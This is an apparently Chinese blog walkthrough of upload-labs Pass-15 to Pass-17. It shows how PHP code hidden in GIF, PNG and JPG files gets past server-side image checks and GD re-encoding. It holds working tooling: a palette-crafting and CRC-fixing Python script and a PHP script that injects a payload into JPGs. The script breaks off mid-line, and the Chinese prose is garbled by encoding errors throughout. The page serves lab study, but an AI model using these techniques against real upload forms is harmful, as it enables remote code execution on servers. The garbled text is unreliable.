<p>getimagesizeæºç æœ¬è´¨ä¹Ÿæ˜¯æŸ¥çœ‹æ–‡ä»¶å¤´åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œæ‰€ä»¥Pass-14çš„æ–¹æ³•ä»ç„¶é€‚ç”¨ï¼Œä¸Šä¼ å›¾ç‰‡é©¬ï¼ŒPS è¿™é‡Œè¦æ˜¯è‡ªå·±æ‰‹åŠ¨ä¼ªé€ çš„å›¾ç‰‡é©¬ï¼Œpngä¸ºä¾‹ï¼Œè¦æŠŠæ–‡ä»¶å¤´æ”¹8ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æ”¹æˆæ­£å¸¸å›¾ç‰‡æ–‡ä»¶çš„å‰8ä¸ªå­—èŠ‚,å¦‚ä¸‹</p>
<p><img src="/2022/02/28/upload-labs/2022-03-01-18-16-03.png"></p>
<p>è®¿é—®</p>
<p><img src="/2022/02/28/upload-labs/2022-03-01-16-47-24.png"></p>
<p><strong>å‚è€ƒï¼š</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html#0x03-getimagesizeimagemagickpoc">imagemagické‚‚é€…getimagesizeçš„é‚£ç‚¹äº‹å„¿</a><br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.getimagesize.php#refsect1-function.getimagesize-description">getimagesize</a></p>
<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><strong>æœåŠ¡ç«¯-exif_imagetypeæ£€æŸ¥-å›¾ç‰‡é©¬ç»•è¿‡</strong><br>exif_imagetype<br>exif_imagetype â€” åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹<br>è¯´æ˜<br>exif_imagetype(string $filename): int<br>exif_imagetype() è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚<br>æœ¬å‡½æ•°å¯ç”¨æ¥é¿å…è°ƒç”¨å…¶å®ƒ exif å‡½æ•°ç”¨åˆ°äº†ä¸æ”¯æŒçš„æ–‡ä»¶ç±»å‹ä¸Šæˆ–å’Œ $_SERVER[â€˜HTTP_ACCEPTâ€™] ç»“åˆä½¿ç”¨æ¥æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦å¯ä»¥æ˜¾ç¤ºæŸä¸ªæŒ‡å®šçš„å›¾åƒã€‚  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">å¯èƒ½çš„è¿”å›å€¼</span><br><span class="line"><span class="number">1</span>	IMAGETYPE_GIF</span><br><span class="line"><span class="number">2</span>	IMAGETYPE_JPEG</span><br><span class="line"><span class="number">3</span>	IMAGETYPE_PNG</span><br><span class="line"><span class="number">4</span>	IMAGETYPE_SWF</span><br><span class="line"><span class="number">5</span>	IMAGETYPE_PSD</span><br><span class="line"><span class="number">6</span>	IMAGETYPE_BMP</span><br><span class="line"><span class="number">7</span>	IMAGETYPE_TIFF_IIï¼ˆIntel å­—èŠ‚é¡ºåºï¼‰</span><br><span class="line"><span class="number">8</span>	IMAGETYPE_TIFF_MMï¼ˆMotorola å­—èŠ‚é¡ºåºï¼‰</span><br><span class="line"><span class="number">9</span>	IMAGETYPE_JPC</span><br><span class="line"><span class="number">10</span>	IMAGETYPE_JP2</span><br><span class="line"><span class="number">11</span>	IMAGETYPE_JPX</span><br><span class="line"><span class="number">12</span>	IMAGETYPE_JB2</span><br><span class="line"><span class="number">13</span>	IMAGETYPE_SWC</span><br><span class="line"><span class="number">14</span>	IMAGETYPE_IFF</span><br><span class="line"><span class="number">15</span>	IMAGETYPE_WBMP</span><br><span class="line"><span class="number">16</span>	IMAGETYPE_XBM</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥è¿˜æ˜¯æ£€æŸ¥æ–‡ä»¶å¤´ä»¥åŠæ–‡ä»¶ç»“å°¾ï¼Œå‰é¢çš„å›¾ç‰‡é©¬è¿˜å¯ä»¥ç”¨ï¼Œä¸Šä¼ ï¼ˆç‹—å¤´ï¼‰</p>
<p><img src="/2022/02/28/upload-labs/2022-03-01-18-11-03.png"><br>ç„¶åå‘ç°è¿™ç§å’ŒçœŸå®å›¾ç‰‡ç»“åˆçš„æ–¹å¼è€æ˜¯æŠ¥é”™ï¼Œæ‰€ä»¥è¿˜ä¼ æ‰‹åŠ¨ä¿®æ”¹çš„ï¼ŒåŒPass-16</p>
<p><img src="/2022/02/28/upload-labs/2022-03-01-18-16-24.png"></p>
<p>è®¿é—®å¾—åˆ°</p>
<p><img src="/2022/02/28/upload-labs/2022-03-01-18-16-47.png"></p>
<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p><strong>æœåŠ¡ç«¯-imagecreatefromæ£€æŸ¥-å›¾ç‰‡é©¬ç»•è¿‡</strong><br>è¿™é‡Œå› ä¸ºæ˜¯imagecreatefrom*é‡å†™ï¼Œæ‰€ä»¥å°±æ¯”è¾ƒéº»çƒ¦ï¼Œå› ä¸ºgifè¢«é‡å†™çš„æ•°æ®è¾ƒå°‘ï¼Œæ‰€ä»¥å…ˆä»gifå…¥æ‰‹  </p>
<p>1ã€gifç»•è¿‡<br>æ‰¾ä¸€å¼ gifï¼Œå•é¢çš„gifï¼Œä¸Šä¼ ï¼Œç„¶åä¸‹è½½ï¼Œæ”¾è¿›010editerå¯¹æ¯”<br>ï¼ˆè¿™é‡Œæˆ‘æ˜¯åœ¨ç½‘ä¸Šæ‰¾äº†ä¸€å¼ gifï¼Œä¸Šä¼ åè®¿é—®åªæœ‰å•é¢äº†ï¼Œå†ä¸Šä¼ è¿™ä¸ªå•é¢çš„gifï¼Œå†æ”¾å‘ç°å‡ ä¹æ²¡æœ‰é‡å†™ï¼Œä¹Ÿå°±æ˜¯å¾ˆæ–¹ä¾¿å†™é©¬ã€‚æ¢å¥è¯è¯´ä¹Ÿå¯ä»¥åœ¨æœ¬åœ°ä½¿ç”¨imagecreatefrom*é‡å†™ä»¥ä½œå‡†å¤‡ï¼‰</p>
<p><img src="/2022/02/28/upload-labs/2022-03-02-07-58-21.png"></p>
<p>å¯ä»¥çœ‹åˆ°å…¨éƒ¨ä¸€æ ·ï¼Œå¯ä»¥åœ¨å›¾ä¸Šæ’å…¥é©¬</p>
<p>ä¸Šä¼ ä¹‹åæœ‰æŠ¥é”™ï¼ˆæ–‡ä»¶åŒ…å«çš„æ—¶å€™ï¼Œå›¾ç‰‡è¢«å½“ä½œæ–‡æœ¬ï¼Œæ‰€ä»¥å¯èƒ½æœ‰æŠ¥é”™ã€‚å›¾ç‰‡çš„é—®é¢˜ï¼Œæ‰€ä»¥è¿˜è¦çœ‹ä¸€éƒ¨ä»½è¿æ°”ã€‚ï¼‰  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning: Unexpected character <span class="keyword">in</span> <span class="built_in">input</span>: <span class="string">&#x27;&#x27;</span> (ASCII=<span class="number">27</span>) state=<span class="number">0</span> <span class="keyword">in</span> D:\phpstudy\PHPTutorial\WWW\upload\upload-labs\upload\<span class="number">7199.</span>gif on line <span class="number">5</span></span><br><span class="line"></span><br><span class="line">Parse error: syntax error, unexpected T_STRING <span class="keyword">in</span> D:\phpstudy\PHPTutorial\WWW\upload\upload-labs\upload\<span class="number">7199.</span>gif on line <span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>æŠŠæŠ¥é”™éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯ç¬¬5è¡Œåˆ é™¤ï¼ŒåŒæ—¶ä¿è¯æœ¨é©¬è¿˜åœ¨å›¾ç‰‡é‡Œï¼Œå¦‚ä¸‹</p>
<p><img src="/2022/02/28/upload-labs/2022-03-02-08-06-09.png"></p>
<p>ä¸Šä¼ ï¼Œåˆ©ç”¨</p>
<p><img src="/2022/02/28/upload-labs/2022-03-02-08-04-45.png"><br>2ã€png   </p>
<p>æ³•1ï¼š<br>ç»æµ‹è¯•ï¼Œä»¥åŠæŸ¥é˜…èµ„æ–™ï¼Œpngæ ¼å¼å›¾ç‰‡åªæœ‰ç´¢å¼•å›¾åƒä¹Ÿå°±æ˜¯index-colorçš„ï¼Œæ‰ä¼šæœ‰æ’é©¬çš„ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯PLTEåé¢çš„åƒç´ æ•°æ®éƒ¨åˆ†ï¼Œè€Œä¸”è¿˜è¦è€ƒè™‘æ ¡éªŒå€¼ç­‰ï¼Œç›¸å¯¹éº»çƒ¦ä¸€äº›ã€‚<br>ä¸€èˆ¬å›¾ç‰‡ä¸æ˜¯index-colorå›¾ç‰‡ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³ä¿®æ”¹å…¶ä¸ºindex-colorå›¾ç‰‡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åˆ¶ä½œç´¢å¼•å›¾</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randomPalette</span>(<span class="params">length, <span class="built_in">min</span>, <span class="built_in">max</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [randint(<span class="built_in">min</span>, <span class="built_in">max</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(length)]</span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;test.png&#x27;</span></span><br><span class="line">img = Image.<span class="built_in">open</span>(path).convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line"><span class="comment"># img.show()</span></span><br><span class="line">i = randomPalette(<span class="number">90</span>, <span class="number">65</span>,<span class="number">122</span> )<span class="comment">#50æ˜¯PLTEçš„é•¿åº¦ï¼Œå¿…é¡»æ˜¯ä¸‰çš„å€æ•°ï¼Œè¿™éƒ¨åˆ†ä¹Ÿæ˜¯å†™å…¥shellçš„ç©ºé—´ã€‚ï¼ˆ65ï¼Œ122ï¼‰æ˜¯éšæœºäº§ç”Ÿåƒç´ å€¼çš„èŒƒå›´ï¼Œé€‰æ‹©äº†å­—æ¯çš„asciièŒƒå›´ï¼Œé¿å…åŒ…å«å‡ºé”™ï¼Œä¹Ÿå¯ä»¥è‡ªå®šè¿™éƒ¨åˆ†ã€‚</span></span><br><span class="line"><span class="built_in">print</span> (i)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(i))</span><br><span class="line">img.putpalette(i)</span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">&#x27;test_01.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆä¹‹åï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å¤§è‡´çš„ç»“æ„ï¼Œè“è‰²æ˜¯PLTEï¼Œæ˜¯payloadåŒºåŸŸï¼Œç´§æ¥ç€æ˜¯CRCæ ¡éªŒï¼Œæ˜¯æˆ‘ä»¬æ’å…¥payloadä¹‹åè¦ä¿®æ”¹çš„ï¼Œå‰©ä½™ä¸ºå‡ ä¸ªpngæ–‡ä»¶å¤´çš„æ ‡å¿—ã€‚</p>
<p><img src="/2022/02/28/upload-labs/2022-03-03-08-29-54.png"></p>
<p>æ’å…¥payload</p>
<p><img src="/2022/02/28/upload-labs/2022-03-03-08-35-09.png"></p>
<p>é‡æ–°è®¡ç®—crc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">png = <span class="built_in">open</span>(<span class="string">r&#x27;bingbing_04.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span></span><br><span class="line">data =  <span class="string">&#x27;504c5445&#x27;</span>+ re.findall(<span class="string">&#x27;504c5445(.*?)49444154&#x27;</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:-<span class="number">16</span>].decode(<span class="string">&#x27;hex&#x27;</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(crc))</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ° 0xd4a5055dL ï¼Œå¡«å…¥CRCä½ç½®</p>
<p><img src="/2022/02/28/upload-labs/2022-03-03-08-40-58.png"></p>
<p>ç„¶åä¸Šä¼ ï¼ŒåŒ…å«å³å¯ï¼Œéƒ¨åˆ†å›¾ç‰‡shellä¼šè¢«åæ‰ä¸€éƒ¨åˆ†ï¼ŒåŸå› å¾…è¡¥ï¼Œäº¦æˆ–æ˜¯ç¼–ç é”™è¯¯ï¼Œå¯ä»¥å¤šè¯•è¯•å‡ ä¸ªå›¾ç‰‡ã€‚</p>
<p><img src="/2022/02/28/upload-labs/2022-03-03-12-45-20.png"></p>
<p>3ã€jpg  </p>
<p>è¿™é‡ŒåŸç†å¾…è¡¥  </p>
<p>å¤§ä½¬çš„è„šæœ¬ï¼Œè¢«å¦ä¸€ä½å¤§ä½¬å¾®ä¿®äº†ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line"></span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line"></span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line"></span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line"></span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line"></span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line"></span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span 